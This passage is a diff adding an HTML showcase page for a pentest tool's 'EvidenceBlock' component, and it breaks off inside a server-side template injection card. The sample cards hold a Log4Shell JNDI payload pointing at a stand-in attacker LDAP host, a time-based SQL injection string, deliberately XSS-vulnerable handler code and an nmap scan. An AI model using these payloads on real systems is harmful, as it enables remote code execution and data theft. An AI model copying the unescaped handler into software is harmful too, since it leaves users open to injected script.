@@ -1,0 +1,772 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>BJHUNT · EvidenceBlock</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bjhunt-brand-primary: #6366F1;
+  --bjhunt-bg: #07070B;
+  --bjhunt-bg-secondary: #0C0C12;
+  --bjhunt-bg-tertiary: #111118;
+  --bjhunt-text: #F4F4F7;
+  --bjhunt-text-muted: #A1A1AA;
+  --bjhunt-text-subtle: #52525B;
+  --bjhunt-text-disabled: #3F3F46;
+  --bjhunt-border: rgba(255,255,255,0.06);
+  --bjhunt-border-strong: rgba(255,255,255,0.12);
+
+  --sev-critical: #FF453A;
+  --sev-high:     #FF9F0A;
+  --sev-medium:   #FFD60A;
+  --sev-low:      #30D158;
+  --sev-info:     #64D2FF;
+
+  /* Syntax tokens */
+  --syn-kw:      #C792EA;
+  --syn-str:     #C3E88D;
+  --syn-num:     #F78C6C;
+  --syn-fn:      #82AAFF;
+  --syn-comment: #546E7A;
+  --syn-punct:   #7A7A85;
+  --syn-var:     #EEFFFF;
+  --syn-tag:     #F07178;
+  --syn-attr:    #FFCB6B;
+  --syn-url:     #7FDBCA;
+
+  --bjhunt-font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Display', system-ui, sans-serif;
+  --bjhunt-font-mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, monospace;
+  --ease-apple: cubic-bezier(0.25, 0.1, 0.25, 1);
+  --dur-fast: 180ms;
+  --dur-base: 360ms;
+}
+@media (prefers-reduced-motion: reduce) {
+  * { animation: none !important; transition: none !important; }
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  background: var(--bjhunt-bg);
+  color: var(--bjhunt-text);
+  font-family: var(--bjhunt-font-sans);
+  font-size: 14px;
+  font-weight: 300;
+  letter-spacing: -0.005em;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+body::before {
+  content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0;
+  background:
+    radial-gradient(ellipse 80% 60% at 15% 10%, rgba(99,102,241,0.06), transparent 50%),
+    radial-gradient(ellipse 60% 50% at 85% 90%, rgba(255,69,58,0.03), transparent 50%);
+}
+.wrap { position: relative; max-width: 1680px; margin: 0 auto; padding: 80px 64px 120px; z-index: 1; }
+
+/* Header */
+.hdr { margin-bottom: 96px; display: flex; justify-content: space-between; align-items: flex-end; gap: 64px; flex-wrap: wrap; }
+.eyebrow { font-family: var(--bjhunt-font-mono); font-size: 10px; color: var(--bjhunt-text-subtle); text-transform: uppercase; letter-spacing: 0.32em; margin: 0 0 24px; }
+h1 { font-size: 56px; font-weight: 200; letter-spacing: -0.03em; line-height: 1; margin: 0 0 20px; }
+h1 em { font-style: normal; color: var(--bjhunt-text-muted); font-weight: 200; }
+.lede { color: var(--bjhunt-text-muted); font-size: 15px; line-height: 1.6; margin: 0; max-width: 560px; font-weight: 300; }
+.hdr-meta { display: flex; flex-direction: column; gap: 12px; font-family: var(--bjhunt-font-mono); font-size: 10px; color: var(--bjhunt-text-subtle); letter-spacing: 0.1em; text-align: right; }
+.hdr-meta b { color: var(--bjhunt-text-muted); font-weight: 400; }
+
+.section { margin-bottom: 96px; }
+.section-hdr {
+  display: flex; align-items: baseline; justify-content: space-between;
+  padding-bottom: 24px; margin-bottom: 40px;
+  border-bottom: 1px solid var(--bjhunt-border);
+}
+.section-hdr .num { font-family: var(--bjhunt-font-mono); font-size: 10px; color: var(--bjhunt-text-disabled); letter-spacing: 0.32em; margin-right: 20px; }
+.section-hdr h2 { font-size: 22px; font-weight: 300; letter-spacing: -0.015em; margin: 0; flex: 1; }
+.section-hdr .meta { font-family: var(--bjhunt-font-mono); font-size: 10px; color: var(--bjhunt-text-subtle); letter-spacing: 0.15em; text-transform: uppercase; }
+
+/* ═════════════════════════════════════════════════════════════════════
+   EvidenceBlock
+   ═════════════════════════════════════════════════════════════════════ */
+
+.ev {
+  --accent: var(--bjhunt-brand-primary);
+  --accent-rgb: 99, 102, 241;
+  position: relative;
+  background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.003));
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
+  border: 1px solid var(--bjhunt-border);
+  overflow: hidden;
+  isolation: isolate;
+}
+.ev[data-kind="request"]   { --accent: #64D2FF; --accent-rgb: 100, 210, 255; }
+.ev[data-kind="response"]  { --accent: #C792EA; --accent-rgb: 199, 146, 234; }
+.ev[data-kind="payload"]   { --accent: var(--sev-critical); --accent-rgb: 255, 69, 58; }
+.ev[data-kind="code"]      { --accent: var(--bjhunt-brand-primary); --accent-rgb: 99, 102, 241; }
+.ev[data-kind="terminal"]  { --accent: var(--sev-low); --accent-rgb: 48, 209, 88; }
+.ev[data-kind="diff"]      { --accent: #82AAFF; --accent-rgb: 130, 170, 255; }
+.ev[data-kind="ioc"]       { --accent: var(--sev-high); --accent-rgb: 255, 159, 10; }
+.ev[data-kind="screenshot"]{ --accent: #A78BFA; --accent-rgb: 167, 139, 250; }
+
+.ev::before {
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 1px;
+  background: var(--accent);
+  opacity: 0.6;
+}
+
+/* Header */
+.ev-hdr {
+  display: flex; align-items: center; gap: 14px;
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--bjhunt-border);
+  background: rgba(0,0,0,0.25);
+  font-family: var(--bjhunt-font-mono);
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--bjhunt-text-subtle);
+}
+.ev-hdr .kind {
+  display: inline-flex; align-items: center; gap: 8px;
+  color: var(--accent);
+  font-weight: 500;
+}
+.ev-hdr .kind .dot {
+  width: 6px; height: 6px;
+  background: var(--accent);
+  box-shadow: 0 0 8px rgba(var(--accent-rgb), 0.6);
+  flex-shrink: 0;
+}
+.ev-hdr .title {
+  color: var(--bjhunt-text);
+  font-weight: 400;
+  letter-spacing: 0.05em;
+  text-transform: none;
+  font-family: var(--bjhunt-font-sans);
+  font-size: 13px;
+  flex: 1;
+  min-width: 0;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.ev-hdr .meta {
+  display: flex; gap: 18px; flex-shrink: 0;
+  font-variant-numeric: tabular-nums;
+}
+.ev-hdr .meta span { display: inline-flex; gap: 6px; align-items: baseline; }
+.ev-hdr .meta b { color: var(--bjhunt-text-muted); font-weight: 400; }
+
+.ev-actions { display: flex; gap: 2px; margin-left: 8px; }
+.ev-act {
+  appearance: none; background: transparent;
+  border: 1px solid transparent;
+  color: var(--bjhunt-text-subtle);
+  font-family: var(--bjhunt-font-mono);
+  font-size: 9px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  cursor: pointer;
+  transition: all var(--dur-fast) var(--ease-apple);
+}
+.ev-act:hover { color: var(--bjhunt-text); background: rgba(255,255,255,0.04); }
+.ev-act.copied { color: var(--sev-low); }
+
+/* Body (scrollable) */
+.ev-body {
+  position: relative;
+  overflow: auto;
+  max-height: 420px;
+  font-family: var(--bjhunt-font-mono);
+  font-size: 12px;
+  line-height: 1.65;
+  color: var(--syn-var);
+  scrollbar-width: thin;
+  scrollbar-color: rgba(255,255,255,0.1) transparent;
+}
+.ev-body::-webkit-scrollbar { width: 8px; height: 8px; }
+.ev-body::-webkit-scrollbar-track { background: transparent; }
+.ev-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); }
+.ev-body::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.14); }
+
+.ev-pre {
+  display: flex;
+  margin: 0;
+  min-height: 100%;
+}
+.ev-gutter {
+  flex-shrink: 0;
+  padding: 16px 16px 16px 20px;
+  color: var(--bjhunt-text-disabled);
+  user-select: none;
+  text-align: right;
+  border-right: 1px solid var(--bjhunt-border);
+  background: rgba(0,0,0,0.25);
+  font-variant-numeric: tabular-nums;
+  font-size: 11px;
+  font-weight: 300;
+  position: sticky;
+  left: 0;
+  z-index: 1;
+}
+.ev-gutter .ln {
+  display: block;
+  padding-right: 4px;
+}
+.ev-gutter .ln.highlight { color: var(--accent); font-weight: 500; }
+.ev-code {
+  flex: 1;
+  padding: 16px 20px 16px 20px;
+  white-space: pre;
+  min-width: 0;
+}
+.ev-code .line {
+  display: block;
+  min-height: 1.65em;
+}
+.ev-code .line.highlight {
+  background: rgba(var(--accent-rgb), 0.08);
+  box-shadow: inset 2px 0 0 var(--accent);
+  margin: 0 -20px;
+  padding: 0 20px;
+}
+.ev-code .line.added {
+  background: rgba(48, 209, 88, 0.08);
+  margin: 0 -20px;
+  padding: 0 20px;
+}
+.ev-code .line.removed {
+  background: rgba(255, 69, 58, 0.08);
+  margin: 0 -20px;
+  padding: 0 20px;
+}
+
+/* Syntax tokens */
+.tk-kw      { color: var(--syn-kw); font-weight: 400; }
+.tk-str     { color: var(--syn-str); }
+.tk-num     { color: var(--syn-num); font-variant-numeric: tabular-nums; }
+.tk-fn      { color: var(--syn-fn); }
+.tk-comment { color: var(--syn-comment); font-style: italic; }
+.tk-punct   { color: var(--syn-punct); }
+.tk-tag     { color: var(--syn-tag); }
+.tk-attr    { color: var(--syn-attr); }
+.tk-url     { color: var(--syn-url); }
+.tk-op      { color: var(--syn-kw); }
+.tk-var     { color: var(--syn-var); }
+.tk-prompt  { color: var(--sev-low); font-weight: 500; }
+.tk-warn    { color: var(--sev-high); }
+.tk-err     { color: var(--sev-critical); }
+.tk-muted   { color: var(--bjhunt-text-subtle); }
+.tk-plus    { color: var(--sev-low); }
+.tk-minus   { color: var(--sev-critical); }
+
+/* Footer */
+.ev-foot {
+  display: flex; align-items: center;
+  padding: 10px 20px;
+  border-top: 1px solid var(--bjhunt-border);
+  background: rgba(0,0,0,0.2);
+  font-family: var(--bjhunt-font-mono);
+  font-size: 9px;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--bjhunt-text-disabled);
+}
+.ev-foot .hash { color: var(--bjhunt-text-muted); font-weight: 400; }
+.ev-foot .spacer { flex: 1; }
+
+/* Screenshot variant */
+.ev-screenshot {
+  position: relative;
+  background: #000;
+  aspect-ratio: 16 / 9;
+  overflow: hidden;
+  display: flex; align-items: center; justify-content: center;
+  color: var(--bjhunt-text-disabled);
+  font-family: var(--bjhunt-font-mono);
+  font-size: 11px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+}
+.ev-screenshot-placeholder {
+  background:
+    linear-gradient(135deg, rgba(167,139,250,0.08) 0%, transparent 50%),
+    repeating-linear-gradient(45deg, rgba(255,255,255,0.015) 0 2px, transparent 2px 16px);
+  position: absolute; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  flex-direction: column; gap: 14px;
+}
+.ev-screenshot-frame {
+  width: 80%; max-width: 520px;
+  height: 64%; max-height: 280px;
+  border: 1px solid var(--bjhunt-border-strong);
+  background: #0a0a10;
+  display: flex; flex-direction: column;
+  position: relative;
+  z-index: 1;
+}
+.ev-screenshot-frame-chrome {
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--bjhunt-border);
+  display: flex; align-items: center; gap: 6px;
+}
+.ev-screenshot-frame-chrome i {
+  width: 8px; height: 8px; background: rgba(255,255,255,0.15); border-radius: 50%;
+  display: block;
+}
+.ev-screenshot-frame-chrome .url {
+  margin-left: 8px;
+  flex: 1;
+  font-family: var(--bjhunt-font-mono);
+  font-size: 9px;
+  color: var(--bjhunt-text-subtle);
+  letter-spacing: 0.1em;
+  text-transform: lowercase;
+}
+.ev-screenshot-frame-body {
+  flex: 1;
+  padding: 20px;
+  display: flex; align-items: center; justify-content: center;
+  background:
+    radial-gradient(ellipse at center, rgba(167,139,250,0.1), transparent 70%);
+}
+.ev-screenshot-frame-body .alert {
+  border: 1px solid var(--sev-critical);
+  padding: 10px 14px;
+  font-size: 10px;
+  color: var(--sev-critical);
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  font-family: var(--bjhunt-font-mono);
+  background: rgba(255,69,58,0.08);
+}
+
+/* IOC list variant */
+.ev-ioc-grid {
+  display: grid;
+  grid-template-columns: 100px 1fr auto;
+  font-family: var(--bjhunt-font-mono);
+  font-size: 11px;
+}
+.ev-ioc-grid > * {
+  padding: 10px 20px;
+  border-bottom: 1px solid var(--bjhunt-border);
+}
+.ev-ioc-grid > *:nth-last-child(-n+3) { border-bottom: none; }
+.ev-ioc-grid .type {
+  color: var(--accent);
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  font-size: 9px;
+  font-weight: 500;
+}
+.ev-ioc-grid .val {
+  color: var(--bjhunt-text);
+  word-break: break-all;
+}
+.ev-ioc-grid .src {
+  color: var(--bjhunt-text-subtle);
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  white-space: nowrap;
+}
+
+/* Collapsible */
+.ev[data-collapsed="true"] .ev-body,
+.ev[data-collapsed="true"] .ev-foot { display: none; }
+.ev[data-collapsed="true"] .ev-hdr { border-bottom: none; }
+
+/* Tweaks */
+.tweaks {
+  position: fixed; right: 24px; bottom: 24px; width: 320px;
+  background: rgba(12,12,18,0.72);
+  backdrop-filter: blur(32px) saturate(160%);
+  -webkit-backdrop-filter: blur(32px) saturate(160%);
+  border: 1px solid var(--bjhunt-border-strong);
+  padding: 20px 24px;
+  z-index: 100; display: none;
+  box-shadow: 0 32px 64px rgba(0,0,0,0.6);
+}
+.tweaks.open { display: block; }
+.tweaks h3 { font-family: var(--bjhunt-font-mono); font-size: 9px; text-transform: uppercase; letter-spacing: 0.28em; color: var(--bjhunt-text-subtle); margin: 0 0 16px; padding-bottom: 12px; border-bottom: 1px solid var(--bjhunt-border); font-weight: 400; }
+.tweaks label { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; font-size: 11px; color: var(--bjhunt-text-muted); cursor: pointer; font-weight: 300; }
+.tweaks label:not(:last-child) { border-bottom: 1px solid var(--bjhunt-border); }
+.tw-switch { appearance: none; width: 28px; height: 16px; background: rgba(255,255,255,0.1); position: relative; cursor: pointer; transition: background var(--dur-fast) var(--ease-apple); }
+.tw-switch:checked { background: var(--bjhunt-brand-primary); }
+.tw-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 12px; height: 12px; background: #fff; transition: left var(--dur-fast) var(--ease-apple); }
+.tw-switch:checked::after { left: 14px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="hdr">
+    <div>
+      <p class="eyebrow">W8 · Atomic · 05 / 05</p>
+      <h1>Evidence<em>Block.</em></h1>
+      <p class="lede">Proof, rendered legibly. Eight kinds — request, response, payload, code, terminal, diff, IOC, screenshot — one grammar. Gutter hairline. Accent edge per kind. Copy anywhere.</p>
+    </div>
+    <div class="hdr-meta">
+      <span><b>source</b> evidence-block.tsx</span>
+      <span><b>kinds</b> 8 · color-coded edge</span>
+      <span><b>i18n</b> components.evidenceBlock</span>
+      <span><b>copy</b> clipboard API</span>
+    </div>
+  </header>
+
+  <!-- ───────── 01. HTTP Request ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">01</span><h2>HTTP Request · exploit payload</h2><span class="meta">kind=request · critical</span></div>
+    <div class="ev" data-kind="request">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Request</span>
+        <span class="title">POST /api/search · Log4Shell JNDI injection</span>
+        <div class="meta">
+          <span><b>bytes</b> 847</span>
+          <span><b>ms</b> 124</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act" onclick="toggleCollapse(this)">Collapse</button>
+        </div>
+      </div>
+      <div class="ev-body">
+        <div class="ev-pre">
+          <div class="ev-gutter">
+            <span class="ln">1</span><span class="ln">2</span><span class="ln">3</span><span class="ln">4</span><span class="ln">5</span><span class="ln highlight">6</span><span class="ln">7</span><span class="ln">8</span><span class="ln">9</span><span class="ln">10</span>
+          </div>
+          <div class="ev-code"><span class="line"><span class="tk-kw">POST</span> <span class="tk-url">/api/search?q=test</span> <span class="tk-kw">HTTP/1.1</span></span><span class="line"><span class="tk-attr">Host</span><span class="tk-punct">:</span> target.example.com</span><span class="line"><span class="tk-attr">Content-Type</span><span class="tk-punct">:</span> application/json</span><span class="line"><span class="tk-attr">Accept</span><span class="tk-punct">:</span> */*</span><span class="line"><span class="tk-attr">Cookie</span><span class="tk-punct">:</span> session_id=<span class="tk-muted">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span></span><span class="line highlight"><span class="tk-attr">User-Agent</span><span class="tk-punct">:</span> <span class="tk-err">${jndi:ldap://attacker.bjhunt.local:1389/Exploit}</span></span><span class="line"><span class="tk-attr">X-Forwarded-For</span><span class="tk-punct">:</span> 10.20.30.40</span><span class="line"><span class="tk-attr">Content-Length</span><span class="tk-punct">:</span> <span class="tk-num">42</span></span><span class="line"></span><span class="line"><span class="tk-punct">{</span><span class="tk-str">"query"</span><span class="tk-punct">:</span> <span class="tk-str">"product"</span><span class="tk-punct">,</span> <span class="tk-str">"limit"</span><span class="tk-punct">:</span> <span class="tk-num">10</span><span class="tk-punct">}</span></span></div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>sha256 · <span class="hash">7f4a9c2e8b1d5f3a0e7c9b2d4f6a8e1c3b5d7f9a2c4e6b8d0f2a4c6e8b0d2f4</span></span>
+        <span class="spacer"></span>
+        <span>captured · 14:32:07 UTC · agent exploit</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 02. HTTP Response ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">02</span><h2>HTTP Response · SQL injection confirmation</h2><span class="meta">kind=response · 500 Internal Server Error</span></div>
+    <div class="ev" data-kind="response">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Response</span>
+        <span class="title">500 Internal Server Error · leaked stack trace</span>
+        <div class="meta">
+          <span><b>bytes</b> 1.2k</span>
+          <span><b>ms</b> 8041</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act" onclick="toggleCollapse(this)">Collapse</button>
+        </div>
+      </div>
+      <div class="ev-body">
+        <div class="ev-pre">
+          <div class="ev-gutter">
+            <span class="ln">1</span><span class="ln">2</span><span class="ln">3</span><span class="ln">4</span><span class="ln">5</span><span class="ln">6</span><span class="ln highlight">7</span><span class="ln highlight">8</span><span class="ln">9</span><span class="ln">10</span><span class="ln">11</span><span class="ln">12</span>
+          </div>
+          <div class="ev-code"><span class="line"><span class="tk-kw">HTTP/1.1</span> <span class="tk-err">500 Internal Server Error</span></span><span class="line"><span class="tk-attr">Server</span><span class="tk-punct">:</span> nginx/1.24.0</span><span class="line"><span class="tk-attr">Content-Type</span><span class="tk-punct">:</span> application/json; charset=utf-8</span><span class="line"><span class="tk-attr">X-Request-ID</span><span class="tk-punct">:</span> 7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d</span><span class="line"><span class="tk-attr">Content-Length</span><span class="tk-punct">:</span> <span class="tk-num">1247</span></span><span class="line"></span><span class="line highlight"><span class="tk-punct">{</span><span class="tk-str">"error"</span><span class="tk-punct">:</span> <span class="tk-str">"PG::SyntaxError: ERROR: unterminated quoted string"</span><span class="tk-punct">,</span></span><span class="line highlight">  <span class="tk-str">"query"</span><span class="tk-punct">:</span> <span class="tk-str">"SELECT * FROM products WHERE name ILIKE '%test' AND SLEEP(8)-- %'"</span><span class="tk-punct">,</span></span><span class="line">  <span class="tk-str">"trace"</span><span class="tk-punct">:</span> <span class="tk-punct">[</span></span><span class="line">    <span class="tk-str">"/app/controllers/search_controller.rb:42:in \`execute_query\`"</span><span class="tk-punct">,</span></span><span class="line">    <span class="tk-str">"/app/models/product.rb:18:in \`search\`"</span></span><span class="line">  <span class="tk-punct">]</span><span class="tk-punct">}</span></span></div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>sha256 · <span class="hash">3e2c4a8f1b6d9e5c7a0f2b4d6e8a1c3b5d7f9a2c4e6b8d0f2a4c6e8b0d2f4a6</span></span>
+        <span class="spacer"></span>
+        <span>captured · 14:38:19 UTC · agent recon</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 03. Code (vulnerable source) ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">03</span><h2>Source code · vulnerable handler</h2><span class="meta">kind=code · javascript</span></div>
+    <div class="ev" data-kind="code">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Code</span>
+        <span class="title">app/controllers/admin/audit_controller.js · line 23</span>
+        <div class="meta">
+          <span><b>lang</b> javascript</span>
+          <span><b>lines</b> 18</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act" onclick="toggleCollapse(this)">Collapse</button>
+        </div>
+      </div>
+      <div class="ev-body">
+        <div class="ev-pre">
+          <div class="ev-gutter">
+            <span class="ln">18</span><span class="ln">19</span><span class="ln">20</span><span class="ln">21</span><span class="ln">22</span><span class="ln highlight">23</span><span class="ln highlight">24</span><span class="ln">25</span><span class="ln">26</span><span class="ln">27</span><span class="ln">28</span>
+          </div>
+          <div class="ev-code"><span class="line"><span class="tk-comment">// Admin-only endpoint — renders the audit log viewer</span></span><span class="line"><span class="tk-kw">export</span> <span class="tk-kw">async function</span> <span class="tk-fn">renderAuditLog</span><span class="tk-punct">(</span><span class="tk-var">req</span><span class="tk-punct">,</span> <span class="tk-var">res</span><span class="tk-punct">)</span> <span class="tk-punct">{</span></span><span class="line">  <span class="tk-kw">const</span> entries <span class="tk-op">=</span> <span class="tk-kw">await</span> <span class="tk-fn">loadEntries</span><span class="tk-punct">(</span><span class="tk-var">req</span>.query.window<span class="tk-punct">);</span></span><span class="line"></span><span class="line">  <span class="tk-kw">const</span> rendered <span class="tk-op">=</span> entries.<span class="tk-fn">map</span><span class="tk-punct">(</span><span class="tk-var">entry</span> <span class="tk-op">=&gt;</span> <span class="tk-punct">{</span></span><span class="line highlight">    <span class="tk-comment">// BUG: entry.message interpolated without escaping</span></span><span class="line highlight">    <span class="tk-kw">return</span> <span class="tk-str">\`&lt;tr&gt;&lt;td&gt;\${entry.ts}&lt;/td&gt;&lt;td&gt;\${entry.message}&lt;/td&gt;&lt;/tr&gt;\`</span><span class="tk-punct">;</span></span><span class="line">  <span class="tk-punct">}).</span><span class="tk-fn">join</span><span class="tk-punct">(</span><span class="tk-str">''</span><span class="tk-punct">);</span></span><span class="line"></span><span class="line">  <span class="tk-var">res</span>.<span class="tk-fn">send</span><span class="tk-punct">(</span><span class="tk-fn">layout</span><span class="tk-punct">(</span>rendered<span class="tk-punct">));</span></span><span class="line"><span class="tk-punct">}</span></span></div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>git · <span class="hash">a4f8c12...ff</span> · main</span>
+        <span class="spacer"></span>
+        <span>author · b.johnson · 2025-03-14</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 04. Terminal ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">04</span><h2>Terminal · reconnaissance output</h2><span class="meta">kind=terminal · nmap</span></div>
+    <div class="ev" data-kind="terminal">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Terminal</span>
+        <span class="title">Port scan · 10.20.30.0/24</span>
+        <div class="meta">
+          <span><b>exit</b> 0</span>
+          <span><b>ms</b> 14203</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act" onclick="toggleCollapse(this)">Collapse</button>
+        </div>
+      </div>
+      <div class="ev-body">
+        <div class="ev-pre">
+          <div class="ev-gutter">
+            <span class="ln">1</span><span class="ln">2</span><span class="ln">3</span><span class="ln">4</span><span class="ln">5</span><span class="ln">6</span><span class="ln">7</span><span class="ln">8</span><span class="ln">9</span><span class="ln">10</span><span class="ln">11</span><span class="ln">12</span>
+          </div>
+          <div class="ev-code"><span class="line"><span class="tk-prompt">$</span> nmap <span class="tk-muted">-sV -p- --min-rate=1000</span> 10.20.30.0/24</span><span class="line">Starting Nmap <span class="tk-num">7.94</span> ( https://nmap.org ) at <span class="tk-num">2025-03-14</span> 14:32 UTC</span><span class="line">Nmap scan report for <span class="tk-str">target-01.internal</span> <span class="tk-punct">(</span>10.20.30.12<span class="tk-punct">)</span></span><span class="line">Host is up <span class="tk-punct">(</span><span class="tk-num">0.00031s</span> latency<span class="tk-punct">).</span></span><span class="line"></span><span class="line"><span class="tk-muted">PORT      STATE  SERVICE     VERSION</span></span><span class="line"><span class="tk-num">22</span>/tcp    <span class="tk-prompt">open</span>   ssh         <span class="tk-str">OpenSSH 8.9 (protocol 2.0)</span></span><span class="line"><span class="tk-num">80</span>/tcp    <span class="tk-prompt">open</span>   http        <span class="tk-str">nginx 1.24.0</span></span><span class="line"><span class="tk-num">443</span>/tcp   <span class="tk-prompt">open</span>   https       <span class="tk-str">nginx 1.24.0 (TLS 1.3)</span></span><span class="line"><span class="tk-num">8080</span>/tcp  <span class="tk-prompt">open</span>   http-proxy  <span class="tk-warn">Apache Tomcat 9.0.45</span> <span class="tk-err">(CVE-2021-44228 likely)</span></span><span class="line"><span class="tk-num">3306</span>/tcp  <span class="tk-err">open</span>   mysql       <span class="tk-str">MySQL 5.7.38</span></span><span class="line"><span class="tk-muted">Nmap done: 256 IP addresses (3 hosts up) scanned in 14.20 seconds</span></span></div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>host · <span class="hash">pentest-box-01</span></span>
+        <span class="spacer"></span>
+        <span>captured · 14:32:04 UTC · agent recon</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 05. Diff ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">05</span><h2>Diff · proposed patch</h2><span class="meta">kind=diff · patcher output</span></div>
+    <div class="ev" data-kind="diff">
+      <div class="ev-hdr">
+        <span class="kind"><span class="dot"></span>Diff</span>
+        <span class="title">app/controllers/admin/audit_controller.js</span>
+        <div class="meta">
+          <span><b>+</b> 4</span>
+          <span><b>−</b> 2</span>
+        </div>
+        <div class="ev-actions">
+          <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          <button class="ev-act" onclick="toggleCollapse(this)">Collapse</button>
+        </div>
+      </div>
+      <div class="ev-body">
+        <div class="ev-pre">
+          <div class="ev-gutter">
+            <span class="ln">21</span><span class="ln">22</span><span class="ln">23</span><span class="ln">24</span><span class="ln">25</span><span class="ln">26</span><span class="ln">27</span><span class="ln">28</span><span class="ln">29</span>
+          </div>
+          <div class="ev-code"><span class="line">  <span class="tk-kw">const</span> rendered <span class="tk-op">=</span> entries.<span class="tk-fn">map</span><span class="tk-punct">(</span><span class="tk-var">entry</span> <span class="tk-op">=&gt;</span> <span class="tk-punct">{</span></span><span class="line removed"><span class="tk-minus">-</span>    <span class="tk-comment">// BUG: entry.message interpolated without escaping</span></span><span class="line removed"><span class="tk-minus">-</span>    <span class="tk-kw">return</span> <span class="tk-str">\`&lt;tr&gt;&lt;td&gt;\${entry.ts}&lt;/td&gt;&lt;td&gt;\${entry.message}&lt;/td&gt;&lt;/tr&gt;\`</span><span class="tk-punct">;</span></span><span class="line added"><span class="tk-plus">+</span>    <span class="tk-comment">// FIX: escape user-controlled fields</span></span><span class="line added"><span class="tk-plus">+</span>    <span class="tk-kw">const</span> ts <span class="tk-op">=</span> <span class="tk-fn">escapeHtml</span><span class="tk-punct">(</span><span class="tk-var">entry</span>.ts<span class="tk-punct">);</span></span><span class="line added"><span class="tk-plus">+</span>    <span class="tk-kw">const</span> msg <span class="tk-op">=</span> <span class="tk-fn">escapeHtml</span><span class="tk-punct">(</span><span class="tk-var">entry</span>.message<span class="tk-punct">);</span></span><span class="line added"><span class="tk-plus">+</span>    <span class="tk-kw">return</span> <span class="tk-str">\`&lt;tr&gt;&lt;td&gt;\${ts}&lt;/td&gt;&lt;td&gt;\${msg}&lt;/td&gt;&lt;/tr&gt;\`</span><span class="tk-punct">;</span></span><span class="line">  <span class="tk-punct">}).</span><span class="tk-fn">join</span><span class="tk-punct">(</span><span class="tk-str">''</span><span class="tk-punct">);</span></span></div>
+        </div>
+      </div>
+      <div class="ev-foot">
+        <span>patch · <span class="hash">verified</span> · tests pass</span>
+        <span class="spacer"></span>
+        <span>generated · 14:45:12 UTC · agent patcher</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────── 06. Payload + 07. IOC side by side ───────── -->
+  <section class="section">
+    <div class="section-hdr"><span class="num">06</span><h2>Payload · IOC list</h2><span class="meta">Two kinds, compact contexts</span></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px;">
+      <div class="ev" data-kind="payload">
+        <div class="ev-hdr">
+          <span class="kind"><span class="dot"></span>Payload</span>
+          <span class="title">SSTI · Jinja2 RCE primitive</span>
+          <div class="ev-actions">
+            <button class="ev-act" onclick="copyBlock(this)">Copy</button>
+          </div>
+        </div>
+        <div class="ev-body">
+          <div class="ev-pre">
+            <div class="ev-gutter">
+              <span class="ln">1</span><span class="ln">2</span><span class="ln">3</span>
+            </div>
